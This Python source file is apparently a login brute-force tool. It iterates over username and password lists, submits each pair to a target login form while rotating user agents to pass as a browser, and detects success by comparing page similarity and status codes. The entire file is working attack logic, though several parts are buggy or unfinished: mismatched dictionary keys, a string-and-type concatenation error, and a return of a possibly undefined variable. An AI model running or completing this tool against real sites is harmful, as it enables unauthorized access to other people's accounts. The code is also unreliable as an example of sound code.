import sys
import time
from scipy import rand


import time
import requests
from lxml import html
from scipy import rand
import mechanize
import ssl
success = False

def brute(parameters, passwords):
    '''
    sends all combinations for usernames and passwords to the attack function on the login page
    '''

    content = {'url': parameters['url'],
               'method': parameters['method'],
               'user_param': parameters['user_param'],
               'password_param': parameters['password_param'],
               'action' : parameters['action'],
               'headers': parameters['req_header'],
               'host': parameters['host'],
               'req_body' : parameters['req_body'],
               }

    # return
    req_body_type = get_req_type(content['req_header'])
    
    # if userlist is provided then checks if passwordlist is provided or just 1 password
    if parameters['user_list']:
        for user in parameters['user_list']:
            user = user.strip()
            user = user.split('\t')
            content['username'] = user[0]
            if passwords:
                for password in passwords:
                    password = password.strip()
                    password = password.split('\t')
                    content['password'] = password[0]
                    content = change_cred(content['req_body'], content['user_param'], content['pass_param'], content['username'], content['password'], req_body_type)
                    attack(content)
            else:
                content['password'] = parameters['password']
                attack(content)
    # if 1 username is provided then checks if passwordlist is provided or just 1 password
    elif passwords:
        content['username'] = parameters['username']
        for password in passwords:
            password = password.strip()
            password = password.split('\t')
            content['password'] = password[0]
            attack(content)

    else:
        content['username'] = parameters['username']
        content['password'] = parameters['password']
        attack(content)
        
def get_req_type(type):
    pass
    


def change_cred(req_body, user_param, pass_param, username, password, req_body_type):
    print('type: ' + type(req_body))
    if req_body_type == 'JSON':
        # import ast
        # return ast.literal_eval(req_body)
        req_body[user_param] = username
        req_body[pass_param] = password
        return req_body
    
    elif req_body_type == 'URL_ENCODED':
        import urllib
        # convert from encoded to json
        req_body = urllib.parse.parse_qs(req_body)
        req_body[user_param] = username
        req_body[pass_param] = password
        # convert from json to encoded
        return urllib.parse.urlencode(req_body)

    elif req_body_type == 'HTML':
        pass
    elif req_body_type == 'XML':
        pass
    pass

def attack(content):
    '''
   create a packet containing fake headers and the payload(username,password) and submit it to the server
    '''

    url = content['url']

    # build packet headers in order to disguise as a browser
    headers = content['headers']
    headers['User-Agent'] = get_random_user_agent()
    payload = content['req_body']


    res = requests.get(url)
    if content['method'] == 'post':
        resp = requests.post(content['host'], data=payload)
    else:
        resp = requests.get(url,data=payload,headers=headers)
    print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
    print(resp.status_code)
    if check_login(resp, res):
        print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
        global success
        success = True
        sys.exit(1)

def get_random_user_agent():
    '''generate random user agent to fill in the packet header'''
    import numpy as np
    random_ua = ''
    ua_file = 'utils/user_agent.txt'
    # delays = [5, 10, 15]
    # delay = np.random.choice(delays)
    # time.sleep(delay) # delay

    try:
        with open(ua_file) as f:
            lines = f.readlines()
        if len(lines) > 0:
            random = np.random.RandomState()
            index = random.permutation(len(lines) - 1)
            idx = np.asarray(index, dtype=np.integer)[0]
            random_proxy = lines[int(idx)]
            return random_proxy[0:len(random_proxy) - 2]  # need to fix this later
    except Exception as ex:
        print('Exception in user agent')
        print(str(ex))
    finally:
        return random_proxy[0:len(random_proxy) - 2]


def get_req_type(header):
    type = header['Content-Type']
    if 'json' in type:
        return 'JSON'

    elif 'xml' in type:
        return 'XML'

    else:
        return 'URL_ENCODED'

def check_login(content_1, content_2):
    '''
    checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
    page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
    '''
    from html_similarity import style_similarity, structural_similarity, similarity
    k=0.3
    similarity = k * structural_similarity(content_1.text, content_2.text) + (1 - k) * style_similarity(content_1.text, content_2.text)
    
    if  content_1.status_code > 400:
        return False
    
    elif similarity < 0.7 and len(content_1.text) > len(content_2.text):
        return True
    
    elif  content_1.status_code == 201 or content_1.status_code == 302:
        return True

    else:
        return False

